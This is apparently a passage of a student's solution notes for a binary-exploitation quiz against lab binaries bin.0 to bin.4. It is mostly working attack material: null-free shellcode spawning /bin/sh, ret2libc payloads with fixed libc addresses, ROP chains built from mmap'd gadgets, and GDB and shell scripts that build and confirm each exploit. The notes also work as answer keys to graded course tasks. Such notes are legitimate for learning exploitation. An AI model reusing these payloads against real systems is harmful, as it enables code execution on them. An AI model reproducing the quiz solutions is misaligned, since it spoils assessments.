system  = 0xb7dd58e0
binsh   = 0xb7f42de8

# bin.1, bin.3, bin.4 — ret2libc
r2l = b'A' * offset + p32(system) + p32(0xdeadbeef) + p32(binsh)
for n in [1, 3, 4]:
    with open(f"{BASE}/exploit.{n}", "wb") as f:
        f.write(str(len(r2l)).encode() + b" " + r2l)

# bin.2 — shellcode (replace buf_addr after GDB batch run)
sc = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80'
buf_addr = 0xbfffe2d8   # confirm via: gdb -batch -ex "b *ADDR_AFTER_MEMCPY" -ex "run /tmp/in" -ex "p/x \$ebp-0x30"
sc_pay = sc + b'A' * (offset - len(sc)) + p32(buf_addr)
with open(f"{BASE}/exploit.2", "wb") as f:
    f.write(str(len(sc_pay)).encode() + b" " + sc_pay)
```

### GDB batch to get bin.2 buffer address (write to file, run via PowerShell):

```bash
#!/bin/bash
BIN="/mnt/c/.../bin.2"
chmod 755 "$BIN"
printf "56 AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA" > /tmp/t2in
env -i TEMP=1000 HOME=/root PATH=/usr/bin:/bin setarch i686 -R --3gb \
  gdb -batch \
  -ex "b *0xADDR_AFTER_MEMCPY" \
  -ex "run /tmp/t2in" \
  -ex "p/x \$ebp - 0x30" \
  "$BIN" 2>&1
# Look for: $1 = 0xbfffe2dX — that is your buf_addr
```

### Verify all 4 (write to file, run via PowerShell):

```bash
#!/bin/bash
BASE="/mnt/c/.../SETNAME"
chmod 755 "$BASE"/bin.*
echo "=== BIN 1 ===" && echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb "$BASE/bin.1" "$BASE/exploit.1"
echo "=== BIN 2 ===" && echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb "$BASE/bin.2" "$BASE/exploit.2"
echo "=== BIN 3 ===" && echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb "$BASE/bin.3" "$BASE/exploit.3"
echo "=== BIN 4 ===" && echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb "$BASE/bin.4" "$BASE/exploit.4"
```

---

## SHELLCODE BYTES (reference card)

```
execve("/bin//sh", NULL, NULL) — 23 bytes — no null bytes:

\x31\xc0  xor eax,eax
\x50      push eax           ← NULL string terminator
\x68\x2f\x2f\x73\x68        push "//sh"
\x68\x2f\x62\x69\x6e        push "/bin"
\x89\xe3  mov ebx,esp        ← ebx = ptr to "/bin//sh"
\x31\xc9  xor ecx,ecx        ← ecx = NULL
\x31\xd2  xor edx,edx        ← edx = NULL
\xb0\x0b  mov al,0xb         ← eax = 11 (execve)
\xcd\x80  int 0x80            ← syscall
```

---

## SOLVED EXAMPLES

### bin.0 (warm-up) — shellcode injection

**Vulnerability:** `memcpy(local_buf[52], heap_buf, user_size)` — no bounds check  
**Stack executable:** yes (RWE)  
**Offset to ret addr:** 56 (52 + 4)  
**Buffer address (TEMP=1000, ASLR off):** `0xbfffe2e4`

```bash
printf "60 \x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80AAAAABBBBCCCCAAAABBBBCCCCDDDDAAAA\xe4\xe2\xff\xbf" > file.0
./scripts/run.sh ./bin.0 file.0
```

---

### bin.1, bin.3, bin.4 (out4 quiz) — ret2libc

**Vulnerability:** `memcpy(local_buf[48], heap_buf, user_size)` — no bounds check  
**Stack executable:** NO (RW, NX on) — shellcode would segfault  
**Offset to ret addr:** 52 (0x30 buffer distance + 4 for saved EBP path)  
**libc addresses (TEMP=1000, ASLR off):**

| Symbol | Address |
|--------|---------|
| `system()` | `0xb7dd58e0` |
| `"/bin/sh"` | `0xb7f42de8` |

```python
import struct
offset = 52
payload = b'A'*offset + struct.pack('<I',0xb7dd58e0) + struct.pack('<I',0xdeadbeef) + struct.pack('<I',0xb7f42de8)
with open('exploit', 'wb') as f:
    f.write(str(len(payload)).encode() + b' ' + payload)
```
```bash
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.X exploit
# → uid=1000(andre) ... [then expected segfault]
```

---

### bin.2 (out4 quiz) — shellcode injection

**Stack executable:** YES (RWE)  
**Offset to ret addr:** 52  
**Buffer address (TEMP=1000, ASLR off):** `0xbfffe2d8` ← get from gdb: `$ebp - 0x30`

```python
import struct
sc  = b'\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\x31\xd2\xb0\x0b\xcd\x80'
payload = sc + b'A'*(52-len(sc)) + struct.pack('<I', 0xbfffe2d8)
with open('exploit.2', 'wb') as f:
    f.write(b'56 ' + payload)
```
```bash
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.2 exploit.2
# → uid=1000(andre) ...
```

---

### bin.3 (Quiz3_2025/out4) — mmap ROP chain ✓ 2026-04-02

**Stack:** NX on (RW). **main()** builds gadgets via movb, mmap's them to RWX region.  
**mmap_base:** `0x07048000` · **gadget_base:** `0x070483e8` (= mmap_base + offset(1000))  
**Offset to ret addr:** 52 · **Writable:** `.bss` `0x0804a060` (no init_data in bin.3, zeroed)

Gadget table for bin.3 (decode fresh — differs from bin.4):
```
0x070483e8 +0x00: xor eax,eax; ret
0x070483eb +0x03: pop eax; pop ebx; ret
0x070483ee +0x06: mov [ebx],eax; ret
0x070483f1 +0x09: xor ecx,ecx; ret
0x070483f4 +0x0c: mov ebx,eax; ret
0x070483f7 +0x0f: mov al,0xb; ret
0x070483fa +0x12: xor edx,edx; ret
0x070483fd +0x15: int 0x80; ret
```

```python
import struct
def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)
gb = 0x070483e8; wr = 0x0804a060
chain  = b'A'*52
chain += p32(gb+0x03) + b'/bin' + p32(wr)         + p32(gb+0x06)
chain += p32(gb+0x03) + b'//sh' + p32(wr+4)       + p32(gb+0x06)
chain += p32(gb+0x03) + p32(wr) + p32(0x41414141) + p32(gb+0x0c)
chain += p32(gb+0x09) + p32(gb+0x12) + p32(gb+0x00) + p32(gb+0x0f) + p32(gb+0x15)
with open('exploit.3','wb') as f: f.write(str(len(chain)).encode() + b' ' + chain)
```
```bash
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.3 exploit.3
# → uid=1000(andre) ...
```

---

### bin.4 (Quiz3_2025/out4) — mmap ROP chain ✓ 2026-04-02

**Stack:** NX on (RW). Same mmap mechanism as bin.3 but different gadget order AND has `init_data()`.  
**mmap_base:** `0x07048000` · **gadget_base:** `0x070483e8`  
**Offset to ret addr:** 52  
**Writable:** `0x07048500` (mmap RWX region, zeroed) — NOT `.bss`! init_data fills BSS with `0xffffffff` → no null terminator → execve fails silently.

Gadget table for bin.4 (DIFFERENT from bin.3):
```
0x070483e8 +0x00: pop eax; pop ebx; ret
0x070483eb +0x03: xor eax,eax; ret
0x070483ee +0x06: mov [ebx],eax; ret
0x070483f1 +0x09: mov ebx,eax; ret
0x070483f4 +0x0c: xor ecx,ecx; ret
0x070483f7 +0x0f: xor edx,edx; ret
0x070483fa +0x12: mov al,0xb; ret
0x070483fd +0x15: int 0x80; ret
```

```python
import struct
def p32(v): return struct.pack('<I', v & 0xFFFFFFFF)
gb = 0x070483e8; wr = 0x07048500   # mmap region — zeroed, safe null terminator
chain  = b'A'*52
chain += p32(gb+0x00) + b'/bin' + p32(wr)         + p32(gb+0x06)
chain += p32(gb+0x00) + b'//sh' + p32(wr+4)       + p32(gb+0x06)
chain += p32(gb+0x00) + p32(wr) + p32(0x41414141) + p32(gb+0x09)
chain += p32(gb+0x0c) + p32(gb+0x0f) + p32(gb+0x03) + p32(gb+0x12) + p32(gb+0x15)
with open('exploit.4','wb') as f: f.write(str(len(chain)).encode() + b' ' + chain)
```
```bash
echo 'id' | env -i TEMP=1000 setarch i686 -R --3gb ./bin.4 exploit.4
# → uid=1000(andre) ...
```
